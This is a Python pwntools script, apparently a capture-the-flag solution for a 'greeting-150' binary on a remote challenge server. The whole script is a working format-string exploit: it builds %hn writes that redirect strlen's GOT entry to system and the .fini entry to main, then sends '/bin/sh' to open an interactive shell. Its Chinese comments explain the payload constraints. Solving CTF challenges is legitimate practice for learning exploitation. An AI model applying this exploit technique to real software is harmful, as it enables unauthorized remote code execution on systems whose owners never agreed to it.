from pwn import *  
  
#sh = process('./greeting-150')  
sh = remote("61.147.171.105",64624)  
  
fini_got = 0x8049934  
main_addr = 0x80485ED  
strlen_got = 0x8049A54  
system_plt = 0x8048490  
  
sh.recvuntil('Please tell me your name... ')  
  
#通过观察,这几个地址只有后2字节不一样  
payload = b'a'*2  
payload += p32(strlen_got)  
payload +=  p32(strlen_got+2)  
payload += p32(fini_got)  
  
arr = [  
   0x85ED,  
   0x8490,0x804  
]  
  
#注意，我们的payload长度不能超过64，不然后面的都读取不到，因为最多输入64个字符  
  
#hn 为WORD(字),hhn为BYTE(字节),n为DWORD(双字)  
#修改strlen GOT内容的前2字节  
num = arr[2] - 32  
payload += b'%' + bytes(str(num),'utf-8') + b'c%13$hn'  
#修改strlen GOT内容的后2字节  
num = arr[1] - arr[2]  
payload += b'%' + bytes(str(num),'utf-8') + b'c%12$hn'  
#修改fini的后2字节  
num = arr[0] - arr[1]  
payload += b'%' + bytes(str(num),'utf-8') + b'c%14$hn'  
  
print (len(payload))  
  
sh.sendline(payload)  
  
#get shell  
  
sh.recvuntil('Please tell me your name... ')  
  
sh.sendline('/bin/sh')  
  
sh.interactive()  